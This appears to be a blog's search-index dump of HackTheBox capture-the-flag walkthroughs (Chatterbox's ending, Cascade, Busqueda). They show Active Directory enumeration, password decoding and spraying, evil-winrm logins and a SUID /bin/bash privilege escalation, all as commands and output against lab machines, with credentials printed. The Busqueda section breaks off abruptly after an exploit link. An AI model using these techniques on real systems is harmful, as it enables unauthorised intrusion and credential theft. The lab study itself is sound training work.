Desktop\\root.txtDesktop\\root.txt CHATTERBOX\\Administrator:(F)Successfully processed 1 files; Failed processing 0 filesC:\\Users\\Administrator>```{: .nolineno}Since root.txt file have only permission from Administrator so the user Alfred canâ€™t open it but user Alfred can change the permissions of this file also like this â†’```powershellC:\\Users\\Administrator>icacls C:\\Users\\Administrator\\Desktop\\root.txt /grant alfred:ficacls C:\\Users\\Administrator\\Desktop\\root.txt /grant alfred:fprocessed file: C:\\Users\\Administrator\\Desktop\\root.txtSuccessfully processed 1 files; Failed processing 0 filesC:\\Users\\Administrator>icacls Desktop\\root.txticacls Desktop\\root.txtDesktop\\root.txt CHATTERBOX\\Alfred:(F) CHATTERBOX\\Administrator:(F)Successfully processed 1 files; Failed processing 0 filesC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txt7cef4d0a2785f9b4a8404d1c30f6a0a7C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now as I have full access !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Cascade", "url": "/posts/Cascade/", "categories": "HackTheBox", "tags": "AD Recycle Bin, Active Directory, PrivEsc, SMB, disassemble, ldapsearch", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.182 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nma...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.182 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-24 11:11 ISTNmap scan report for cascade.local (10.10.10.182)Host is up (0.079s latency).Not shown: 65520 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-24 05:44:11Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds?636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49170/tcp open msrpc Microsoft Windows RPCService Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 2:1:0: |_ Message signing enabled and required| smb2-time: | date: 2024-01-24T05:45:03|_ start_date: 2024-01-24T05:04:31|_clock-skew: 1s```{: .nolineno}## LDAP Enumeration â¤µï¸```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ ldapsearch -x -H ldap://10.10.10.182 -b 'dc=cascade,dc=local' > ldapsearch.txt```{: .nolineno}![Untitled](Cascade/Untitled.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ echo \"clk0bjVldmE=\" | base64 -d rY4n5eva```{: .nolineno}I got a password.## RPC Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ rpcclient 10.10.10.182 -U '' -Nrpcclient $> enumdomusersuser:[CascGuest] rid:[0x1f5]user:[arksvc] rid:[0x452]user:[s.smith] rid:[0x453]user:[r.thompson] rid:[0x455]user:[util] rid:[0x457]user:[j.wakefield] rid:[0x45c]user:[s.hickson] rid:[0x461]user:[j.goodhand] rid:[0x462]user:[a.turnbull] rid:[0x464]user:[e.crowe] rid:[0x467]user:[b.hanson] rid:[0x468]user:[d.burman] rid:[0x469]user:[BackupSvc] rid:[0x46a]user:[j.allen] rid:[0x46e]user:[i.croft] rid:[0x46f]rpcclient $>```{: .nolineno}I think I got some more users from rpcclient and also through ldapsearch samaccountname so I gathered all the usernames in a single file named as `users1.txt`.Lets try bruteforcing the SMB service with the users wordlist `users1.txt` file and with this password â†’![Untitled](Cascade/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ smbclient //10.10.10.182/Data -U 'r.thompson'Password for [WORKGROUP\\r.thompson]:Try \"help\" to get a list of possible commands.smb: \\> dir . D 0 Mon Jan 27 08:57:34 2020 .. D 0 Mon Jan 27 08:57:34 2020 Contractors D 0 Mon Jan 13 07:15:11 2020 Finance D 0 Mon Jan 13 07:15:06 2020 IT D 0 Tue Jan 28 23:34:51 2020 Production D 0 Mon Jan 13 07:15:18 2020 Temps D 0 Mon Jan 13 07:15:15 2020\t\t6553343 blocks of size 4096. 1624880 blocks availablesmb: \\> lcd Data/smb: \\> recurse onsmb: \\> prompt offsmb: \\> mget *NT_STATUS_ACCESS_DENIED listing \\Contractors\\*NT_STATUS_ACCESS_DENIED listing \\Finance\\*NT_STATUS_ACCESS_DENIED listing \\Production\\*NT_STATUS_ACCESS_DENIED listing \\Temps\\*getting file \\IT\\Email Archives\\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)getting file \\IT\\Logs\\Ark AD Recycle Bin\\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (1.9 KiloBytes/sec) (average 2.8 KiloBytes/sec)getting file \\IT\\Logs\\DCs\\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (13.9 KiloBytes/sec) (average 5.5 KiloBytes/sec)getting file \\IT\\Temp\\s.smith\\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (4.5 KiloBytes/sec) (average 5.2 KiloBytes/sec)smb: \\> exit```{: .nolineno}I downloaded the data into my attacker system â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade/Data]â””â”€$ tree .â”œâ”€â”€ Contractorsâ”œâ”€â”€ Financeâ”œâ”€â”€ ITâ”‚Â Â  â”œâ”€â”€ Email Archivesâ”‚Â Â  â”‚Â Â  â””â”€â”€ Meeting_Notes_June_2018.htmlâ”‚Â Â  â”œâ”€â”€ LogonAuditâ”‚Â Â  â”œâ”€â”€ Logsâ”‚Â Â  â”‚Â Â  â”œâ”€â”€ Ark AD Recycle Binâ”‚Â Â  â”‚Â Â  â”‚Â Â  â””â”€â”€ ArkAdRecycleBin.logâ”‚Â Â  â”‚Â Â  â””â”€â”€ DCsâ”‚Â Â  â”‚Â Â  â””â”€â”€ dcdiag.logâ”‚Â Â  â””â”€â”€ Tempâ”‚Â Â  â”œâ”€â”€ r.thompsonâ”‚Â Â  â””â”€â”€ s.smithâ”‚Â Â  â””â”€â”€ VNC Install.regâ”œâ”€â”€ Productionâ””â”€â”€ Temps```{: .nolineno}I opened the VNC Install.reg file and I got a password which is encoded â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/Data/IT/Temp/s.smith]â””â”€$ cat VNC\\ Install.reg ï¿½ï¿½Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC][HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server]\"ExtraPorts\"=\"\"\"QueryTimeout\"=dword:0000001e\"QueryAcceptOnTimeout\"=dword:00000000\"LocalInputPriorityTimeout\"=dword:00000003\"LocalInputPriority\"=dword:00000000\"BlockRemoteInput\"=dword:00000000\"BlockLocalInput\"=dword:00000000\"IpAccessControl\"=\"\"\"RfbPort\"=dword:0000170c\"HttpPort\"=dword:000016a8\"DisconnectAction\"=dword:00000000\"AcceptRfbConnections\"=dword:00000001\"UseVncAuthentication\"=dword:00000001\"UseControlAuthentication\"=dword:00000000\"RepeatControlAuthentication\"=dword:00000000\"LoopbackOnly\"=dword:00000000\"AcceptHttpConnections\"=dword:00000001\"LogLevel\"=dword:00000000\"EnableFileTransfers\"=dword:00000001\"RemoveWallpaper\"=dword:00000001\"UseD3D\"=dword:00000001\"UseMirrorDriver\"=dword:00000001\"EnableUrlParams\"=dword:00000001\"Password\"=hex:6b,cf,2a,4b,6e,5a,ca,0f\"AlwaysShared\"=dword:00000000\"NeverShared\"=dword:00000000\"DisconnectClients\"=dword:00000001\"PollingInterval\"=dword:000003e8\"AllowLoopback\"=dword:00000000\"VideoRecognitionInterval\"=dword:00000bb8\"GrabTransparentWindows\"=dword:00000001\"SaveLogToAllUsersPath\"=dword:00000000\"RunControlInterface\"=dword:00000001\"IdleTimeout\"=dword:00000000\"VideoClasses\"=\"\"\"VideoRects\"=\"\"```{: .nolineno}From online recon I got this password decoded for VNC â†’https://github.com/frizb/PasswordDecrypts![Untitled](Cascade/Untitled%202.png)I checked the password for SMB service and it is valid and working â†’![Untitled](Cascade/Untitled%203.png)I got these credentials :```bashr.thompson : rY4n5evas.smith : sT333ve2```{: .nolineno}Lets check of winrm access â†’### WinRM Session â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/Data/IT/Temp/s.smith]â””â”€$ netexec winrm 10.10.10.182 -u s.smith -p 'sT333ve2' SMB 10.10.10.182 445 CASC-DC1 [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)WINRM 10.10.10.182 5985 CASC-DC1 [+] cascade.local\\s.smith:sT333ve2 (Pwn3d!) â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/Data/IT/Temp/s.smith]â””â”€$ evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\s.smith\\Documents> whoamicascade\\s.smith*Evil-WinRM* PS C:\\Users\\s.smith\\Documents> hostnameCASC-DC1*Evil-WinRM* PS C:\\Users\\s.smith\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\s.smith> tree /f /aFolder PATH listingVolume serial number is CF98-2F06C:.+---Desktop| user.txt| WinDirStat.lnk|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\s.smith>```{: .nolineno}I think , I should check the shares of Audit looks different so I did â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ smbclient //10.10.10.182/Audit$ -U 's.smith'Password for [WORKGROUP\\s.smith]:Try \"help\" to get a list of possible commands.smb: \\> dir . D 0 Wed Jan 29 23:31:26 2020 .. D 0 Wed Jan 29 23:31:26 2020 CascAudit.exe An 13312 Wed Jan 29 03:16:51 2020 CascCrypto.dll An 12288 Wed Jan 29 23:30:20 2020 DB D 0 Wed Jan 29 03:10:59 2020 RunAudit.bat A 45 Wed Jan 29 04:59:47 2020 System.Data.SQLite.dll A 363520 Sun Oct 27 12:08:36 2019 System.Data.SQLite.EF6.dll A 186880 Sun Oct 27 12:08:38 2019 x64 D 0 Mon Jan 27 03:55:27 2020 x86 D 0 Mon Jan 27 03:55:27 2020\t\t6553343 blocks of size 4096. 1624324 blocks availablesmb: \\>```{: .nolineno}I got some data also in which I got a database of SQLite so I downloaded those data and the `CascAudit.exe` and `CascCrypto.dll` files.In Audit.db , it has 4 tables :![Untitled](Cascade/Untitled%204.png)![Untitled](Cascade/Untitled%205.png)![Untitled](Cascade/Untitled%206.png)the `Misc` table is empty.I also disassembled the `CascAudit.exe` and `CascCrypto.dll` file with [https://www.decompiler.com/](https://www.decompiler.com/) .I downloaded the disassambled files in a zip and opned offline only â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade/CascadeAudit]â””â”€$ tree .â”œâ”€â”€ CascAudiotâ”‚Â Â  â”œâ”€â”€ MainModule.csâ”‚Â Â  â””â”€â”€ SettingsFile.csâ”œâ”€â”€ CascAudiot.Myâ”‚Â Â  â”œâ”€â”€ MyApplication.csâ”‚Â Â  â”œâ”€â”€ MyComputer.csâ”‚Â Â  â”œâ”€â”€ MyProject.csâ”‚Â Â  â”œâ”€â”€ MySettings.csâ”‚Â Â  â””â”€â”€ MySettingsProperty.csâ”œâ”€â”€ CascAudiot.My.Resourcesâ”‚Â Â  â””â”€â”€ Resources.csâ”œâ”€â”€ CascAudit.csprojâ””â”€â”€ Properties â””â”€â”€ AssemblyInfo.cs```{: .nolineno}and in dll file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade/dll]â””â”€$ tree .â”œâ”€â”€ app.icoâ”œâ”€â”€ CascCryptoâ”‚Â Â  â””â”€â”€ Crypto.csâ”œâ”€â”€ CascCrypto.csprojâ”œâ”€â”€ CascCrypto.dll_Decompiler.com.zipâ”œâ”€â”€ CascCrypto.Myâ”‚Â Â  â”œâ”€â”€ MyApplication.csâ”‚Â Â  â”œâ”€â”€ MyComputer.csâ”‚Â Â  â”œâ”€â”€ MyProject.csâ”‚Â Â  â”œâ”€â”€ MySettings.csâ”‚Â Â  â””â”€â”€ MySettingsProperty.csâ”œâ”€â”€ CascCrypto.My.Resourcesâ”‚Â Â  â””â”€â”€ Resources.csâ””â”€â”€ Properties â””â”€â”€ AssemblyInfo.cs```{: .nolineno}Now its time for inspection so I opened the `CascAudiot > MainModule.cs` file in sublime and got the secret key for encoding the LDAP password â†’![Untitled](Cascade/Untitled%207.png)And from /CascCrypto/Crypto.cs I got the AES encoded salt and the type of mode that is CBS so lets decode our password â†’![Untitled](Cascade/Untitled%208.png)I used this online site to docode the encoded password :[](https://www.javainuse.com/aesgenerator)![Untitled](Cascade/Untitled%209.png)I got the LDAP password decoded as `w3lc0meFr31nd` for user `ArkSvc` :```bashArkSvc : w3lc0meFr31nd```{: .nolineno}I started the winrm session â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> whoamicascade\\arksvc*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> hostnameCASC-DC1*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> whoami /allUSER INFORMATION----------------User Name SID============== =======================================cascade\\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106GROUP INFORMATION-----------------Group Name Type SID Attributes=========================================== ================ ============================================== ========================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupCASCADE\\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\\AD Recycle Bin Alias S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local GroupCASCADE\\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local GroupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> net user arksvcUser name arksvcFull Name ArkSvcCommentUser's commentCountry code 000 (System Default)Account active YesAccount expires NeverPassword last set 1/9/2020 4:18:20 PMPassword expires NeverPassword changeable 1/9/2020 4:18:20 PMPassword required YesUser may change password NoWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 1/29/2020 9:05:40 PMLogon hours allowed AllLocal Group Memberships *AD Recycle Bin *IT *Remote Management UseGlobal Group memberships *Domain UsersThe command completed successfully.*Evil-WinRM* PS C:\\Users\\arksvc\\Documents>```{: .nolineno}Since this user arksvc is a part of AD Recycle Bin that means this user have capability to see the deleted items in AD.## **[AD Recycle Bin](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-recycle-bin)**This group gives you permission to read deleted AD object. Something juicy information can be found in there:```bash#This is not a powerview command, it's a feature from the AD management powershell module of Microsoft#You need to be in the \"AD Recycle Bin\" group of the AD to list the deleted AD objectsGet-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *```{: .nolineno}I executed this command and I got this â†’```bash*Evil-WinRM* PS C:\\Users\\arksvc\\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *......CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVzCN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059codePage : 0countryCode : 0Created : 1/27/2020 3:23:08 AMcreateTimeStamp : 1/27/2020 3:23:08 AMDeleted : TrueDescription :DisplayName : TempAdminDistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=localdSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}givenName : TempAdmininstanceType : 4isDeleted : TrueLastKnownParent : OU=Users,OU=UK,DC=cascade,DC=locallastLogoff : 0lastLogon : 0logonCount : 0Modified : 1/27/2020 3:24:34 AMmodifyTimeStamp : 1/27/2020 3:24:34 AMmsDS-LastKnownRDN : TempAdminName : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059nTSecurityDescriptor : System.DirectoryServices.ActiveDirectorySecurityObjectCategory :ObjectClass : userObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059objectSid : S-1-5-21-3332504370-1206983947-1165150453-1136primaryGroupID : 513ProtectedFromAccidentalDeletion : FalsepwdLastSet : 132245689883479503sAMAccountName : TempAdminsDRightsEffective : 0userAccountControl : 66048userPrincipalName : TempAdmin@cascade.localuSNChanged : 237705uSNCreated : 237695whenChanged : 1/27/2020 3:24:34 AMwhenCreated : 1/27/2020 3:23:08 AM*Evil-WinRM* PS C:\\Users\\arksvc\\Documents>```{: .nolineno}I got this `cascadeLegacyPwd` : `YmFDVDNyMWFOMDBkbGVz` so lets decode this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ echo \"YmFDVDNyMWFOMDBkbGVz\" | base64 -dbaCT3r1aN00dles```{: .nolineno}I guess this user TempAdmin may be related to Administrator so I tried netexec to check for itâ†’![Untitled](Cascade/Untitled%2010.png)```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Cascade]â””â”€$ evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles Evil-WinRM shell v3.5 *Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoamicascade\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> hostnameCASC-DC1*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cd ..*Evil-WinRM* PS C:\\Users\\Administrator> tree /f /aFolder PATH listingVolume serial number is CF98-2F06C:.| wds_current_setup.exe|+---Contacts+---Desktop| root.txt|+---Documents+---Downloads+---Favorites| +---Links| | Suggested Sites.url| | Web Slice Gallery.url| || +---Microsoft Websites| | IE Add-on site.url| | IE site on Microsoft.com.url| | Microsoft At Home.url| | Microsoft At Work.url| | Microsoft Store.url| || +---MSN Websites| | MSN Autos.url| | MSN Entertainment.url| | MSN Money.url| | MSN Sports.url| | MSN.url| | MSNBC News.url| || \\---Windows Live| Get Windows Live.url| Windows Live Gallery.url| Windows Live Mail.url| Windows Live Spaces.url|+---Links| Desktop.lnk| Downloads.lnk| RecentPlaces.lnk|+---Music+---Pictures+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator> type Desktop\\root.txt0420af249f2ab75f67d6881252557205*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Busqueda", "url": "/posts/Busqueda/", "categories": "HackTheBox", "tags": "PrivEsc, Public Exploit, gitea, searcher", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Busqueda]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.208[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.o...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Busqueda]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.208[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-29 10:05 ISTNmap scan report for searcher.htb (10.10.11.208)Host is up (0.63s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)|_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: Searcher| http-server-header: | Apache/2.4.52 (Ubuntu)|_ Werkzeug/2.1.2 Python/3.10.6Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed.```{: .nolineno}## Web Enumeration â¤µï¸I loaded this port 80 and I got redirected to `searcher.htb` domain name so I set the `/etc/hosts` file in the attackers machine and got this simple site â†’![Untitled](Busqueda/Untitled.png)I got this version of this CMS site `Searchor 2.4.0` and I searched the exploit of it and got this exploit of `command Injection` through python.[GitHub - nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection: Reverse Shell Exploit for Searchor /dev/null-rw-r--r-- 1 svc svc 220 Jan 6 2022 .bash_logout-rw-r--r-- 1 svc svc 3771 Jan 6 2022 .bashrcdrwx------ 2 svc svc 4096 Feb 28 2023 .cache-rw-rw-r-- 1 svc svc 76 Apr 3 2023 .gitconfigdrwxrwxr-x 5 svc svc 4096 Jun 15 2022 .locallrwxrwxrwx 1 root root 9 Apr 3 2023 .mysql_history -> /dev/null-rw-r--r-- 1 svc svc 807 Jan 6 2022 .profilelrwxrwxrwx 1 root root 9 Feb 20 2023 .searchor-history.json -> /dev/null-rw-r----- 1 root svc 33 Dec 28 16:47 user.txtsvc@busqueda:~$ cat user.txtcat user.txtffcc2dd47b3d6d1c3a86566951886a72svc@busqueda:~$svc@busqueda:/var/www/app/.git$ sudo -l[sudo] password for svc: Matching Defaults entries for svc on busqueda: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py *svc@busqueda:/var/www/app/.git$```{: .nolineno}I used this command and got 3 options â†’```bashsvc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py bacdUsage: /opt/scripts/system-checkup.py (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkupsvc@busqueda:/tmp$```{: .nolineno}I used the `docker-inspect` command with format flag â†’![Untitled](Busqueda/Untitled%203.png)so lets use this command â†’```bashsvc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py docker-ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES960873171e2e gitea/gitea:latest \"/usr/bin/entrypointâ€¦\" 11 months ago Up 12 hours 127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp giteaf84a6b33fb5a mysql:8 \"docker-entrypoint.sâ€¦\" 11 months ago Up 12 hours 127.0.0.1:3306->3306/tcp, 33060/tcp mysql_db```{: .nolineno}I got 2 images of docker that can have its own configuration file so lets try it on mysql and I think I will get the credentials of mysql account â†’```bashsvc@busqueda:/var/www/app/.git$ sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a--format={\"Hostname\":\"f84a6b33fb5a\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"3306/tcp\":{},\"33060/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF\",\"MYSQL_USER=gitea\",\"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh\",\"MYSQL_DATABASE=gitea\",\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"GOSU_VERSION=1.14\",\"MYSQL_MAJOR=8.0\",\"MYSQL_VERSION=8.0.31-1.el8\",\"MYSQL_SHELL_VERSION=8.0.31-1.el8\"],\"Cmd\":[\"mysqld\"],\"Image\":\"mysql:8\",\"Volumes\":{\"/var/lib/mysql\":{}},\"WorkingDir\":\"\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{\"com.docker.compose.config-hash\":\"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b\",\"com.docker.compose.container-number\":\"1\",\"com.docker.compose.oneoff\":\"False\",\"com.docker.compose.project\":\"docker\",\"com.docker.compose.project.config_files\":\"docker-compose.yml\",\"com.docker.compose.project.working_dir\":\"/root/scripts/docker\",\"com.docker.compose.service\":\"db\",\"com.docker.compose.version\":\"1.29.2\"}}svc@busqueda:/var/www/app/.git$```{: .nolineno}Lets use its password on gitea site for administrators access and when I tried it I got in â†’![Untitled](Busqueda/Untitled%204.png)when I checked `system-checkup.py` file I noticed that the file path is not specified so I will be creating a file in any directory with name as `full-checkup.sh` file and insert the payload into the I will be payload to make `/bin/bash` as SUIDs permissions :![Untitled](Busqueda/Untitled%205.png)Lets use the `sudo python3 /opt/scripts/system-checkup.py full-checkup` command â†’```bashsvc@busqueda:/tmp$ ls -al /bin/bash-rwxr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bashsvc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup[+] Done!svc@busqueda:/tmp$ ls -al /bin/bash-rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bashsvc@busqueda:/tmp$ bash -pbash-5.1# ls -albash-5.1# cd /rootbash-5.1# ls -altotal 60drwx------ 9 root root 4096 Dec 28 16:47 .drwxr-xr-x 19 root root 4096 Mar 1 2023 ..lrwxrwxrwx 1 root root 9 Feb 20 2023 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 3 root root 4096 Mar 1 2023 .cachedrwx------ 3 root root 4096 Mar 1 2023 .config-rw-r----- 1 root root 430 Apr 3 2023 ecosystem.config.js-rw-r--r-- 1 root root 104 Apr 3 2023 .gitconfigdrwxr-xr-x 3 root root 4096 Mar 1 2023 .local-rw------- 1 root root 50 Feb 20 2023 .my.cnflrwxrwxrwx 1 root root 9 Feb 20 2023 .mysql_history -> /dev/nulldrwxr-xr-x 4 root root 4096 Mar 1 2023 .npmdrwxr-xr-x 5 root root 4096 Dec 28 16:47 .pm2-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Dec 28 16:47 root.txtdrwxr-xr-x 4 root root 4096 Apr 3 2023 scriptsdrwx------ 3 root root 4096 Mar 1 2023 snapbash-5.1# whoamirootbash-5.1# iduid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)bash-5.1# cat root.txt2b58c418e01ad180b2c4f5c363e9bc8ebash-5.1#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Buff", "url": "/posts/Buff/", "categories": "HackTheBox", "tags": "Port Forwarding, PrivEsc, 